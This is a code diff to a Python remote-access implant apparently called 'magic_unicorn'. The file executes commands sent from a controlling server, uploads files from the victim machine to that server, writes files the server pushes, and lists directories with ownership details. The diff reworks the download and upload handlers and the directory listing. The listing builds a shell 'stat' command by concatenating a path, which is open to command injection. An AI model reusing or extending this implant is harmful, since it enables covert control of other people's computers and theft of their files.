@@ -8,8 +8,6 @@ import sys
 import platform
 import getpass
 import pathlib
-import pwd
-import grp
 import time
 import datetime
 
@@ -40,6 +38,38 @@ class handler:
             payloaded_packet += frame
         return payloaded_packet
 
+class fsmanip:
+    def __init__(self):
+        self.fsmanip_init = 1
+        self.error = '\033[1;31m[-] \033[0m'
+        
+    def exists_directory(self, path):
+        if os.path.isdir(path):
+            if os.path.exists(path):
+                return (True, "directory")
+            else:
+                return (False, self.error+"Remote directory: "+path+": does not exist!")
+        else:
+            directory = os.path.split(path)[0]
+            if directory == "":
+                directory = "."
+            if os.path.exists(directory):
+                if os.path.isdir(directory):
+                    return (True, "file")
+                else:
+                    return (False, self.error+"Error: "+directory+": not a directory!")
+            else:
+                return (False, self.error+"Remote directory: "+directory+": does not exist!")
+            
+    def file(self, path):
+        if os.path.exists(path):
+            if os.path.isdir(path):
+                return (False, self.error+"Error: "+path+": not a file!")
+            else:
+                return (True, None)
+        else:
+            return (False, self.error+"Remote file: "+path+": does not exist!")
+   
 class custom:
     def __init__(self):
         self.python = "python3"
@@ -68,6 +98,7 @@ class magic_unicorn:
         self.handler = handler(server)
         self.custom = custom()
         self.badges = badges()
+        self.fsmanip = fsmanip()
         
         self.main_directory = os.getcwd()
         self.home_directory = str(pathlib.Path.home())
@@ -146,39 +177,50 @@ class magic_unicorn:
                     return
 
     def command_download(self, cmd_data):
-        if not cmd_data.strip():
-            pass
-        else:
-            output_filename = cmd_data.split("/")[-1] if "/" in cmd_data else cmd_data.split("\\")[-1] if "\\" in cmd_data else cmd_data
-            wf = open(output_filename, "wb")
+        output_filename = os.path.split(cmd_data.split(" ")[0])[1]
+        output_directory = cmd_data.split(" ")[1]
+        exists, path_type = self.fsmanip.exists_directory(output_directory)
+        if exists:
+            self.handler.send("success".encode("UTF-8"))
+            if path_type != "file":
+                if output_directory[-1] == "/":
+                    output_directory = output_directory + output_filename
+                else:
+                    output_directory = output_directory + "/" + output_filename
+                            
+            wf = open(output_directory, "wb")
             while True:
                 data = self.handler.recv()
                 if data == b"success":
+                    result = ""
+                    result += f"{self.badges.G}Saving to {output_directory}...\n"
+                    result += f"{self.badges.S}Saved to {output_directory}!"
+                    self.handler.send(result.encode("UTF-8"))
                     break
                 elif data == b"fail":
                     wf.close()
-                    os.remove(output_filename)
+                    os.remove(output_directory)
                     return
                 wf.write(data)
             wf.close()
+        else:
+            self.handler.send(path_type.encode("UTF-8"))
 
     def command_upload(self, cmd_data):
-        if not cmd_data.strip():
-            pass
+        exists, error = self.fsmanip.file(cmd_data)
+        if exists:
+            self.handler.send("success".encode("UTF-8"))
+            with open(cmd_data, "rb") as wf:
+                for data in iter(lambda: wf.read(4100), "".encode("UTF-8")):
+                    try:
+                        self.handler.send(data)
+                    except (KeyboardInterrupt, EOFError):
+                        wf.close()
+                        self.handler.send("fail".encode("UTF-8"))
+                        return
+            self.handler.send("success".encode("UTF-8"))
         else:
-            if not os.path.isfile(cmd_data):
-                self.handler.send((self.badges.E +"Remote file: {}: does not exist!".format(cmd_data)).encode("UTF-8"))
-            else:
-                self.handler.send("true".encode("UTF-8"))
-                with open(cmd_data, "rb") as wf:
-                    for data in iter(lambda: wf.read(4100), "".encode("UTF-8")):
-                        try:
-                            self.handler.send(data)
-                        except(KeyboardInterrupt,EOFError):
-                            wf.close()
-                            self.handler.send("fail".encode("UTF-8"))
-                            return
-                self.handler.send("success".encode("UTF-8"))
+            self.handler.send(error.encode("UTF-8"))
 
     def command_load(self, cmd_data):
         self.handler.send(bytes(self.custom.execute(cmd_data).strip()))
@@ -197,8 +239,7 @@ class magic_unicorn:
             for i in sorted(os.listdir(cmd_data)):
                 names.append(i)
             directory_contents = ""
-            directory_contents += "\n"
-            directory_contents += "Listing: " + cmd_data[:-1] + "\n"
+            directory_contents += "\nListing: " + cmd_data[:-1] + "\n"
             directory_contents += "=" * len("Listing: " + cmd_data[:-1]) + "\n"
             directory_contents += "\n"
             owners = []
@@ -207,14 +248,11 @@ class magic_unicorn:
             dates = []
             modes = []
             for i in names:
-                owners.append(pwd.getpwuid(os.stat(cmd_data + i).st_uid)[0])
-                groups.append(grp.getgrgid(os.stat(cmd_data + i).st_gid)[0])
-                sizes.append(str(os.stat(cmd_data + i).st_size))
+                owners.append(pathlib.Path(cmd_data + i).owner())
+                groups.append(pathlib.Path(cmd_data + i).group())
+                sizes.append(str(os.path.getsize(cmd_data + i)))
                 dates.append(time.ctime(os.path.getmtime(cmd_data + i)))
-                if os.path.isdir(cmd_data + i):
-                    modes.append(os.popen("ls -al " + cmd_data + i).read().split(" ")[1].split("\n")[1])
-                else:
-                    modes.append(os.popen("ls -al " + cmd_data + i).read().split(" ")[0])
+                modes.append(os.popen("stat '" + cmd_data + i + "'").read().split(" ")[2])
             bigger_owner = len(owners[0])
             bigger_group = len(groups[0])
             bigger_size = len(sizes[0])
@@ -255,7 +293,6 @@ class magic_unicorn:
             directory_contents += "-----"+" "*(bigger_mode_len)+"-----"+" "*(bigger_owner_len)+"-----"+" "*(bigger_group_len)+"----"+" "*(bigger_size_len)+"-------------"+" "*(bigger_date_len)+"----\n"
             for i in range(0, len(names)):
                 directory_contents += modes[i] + " " * (5 - len(modes[i]) + bigger_mode_len) + owners[i] + " " * (5 - len(owners[i]) + bigger_owner_len) + groups[i] + " " * (5 - len(groups[i]) + bigger_group_len) + sizes[i] + " " * (4 - len(sizes[i]) + bigger_size_len) + dates[i] + " " * (13 - len(dates[i]) + bigger_date_len) + names[i] + "\n"
-            directory_contents += "\n"
             self.handler.send(directory_contents.encode("UTF-8"))
         else:
             self.handler.send((self.badges.E + "Error: " + cmd_data[:-1] + ": not a directory!").encode("UTF-8"))
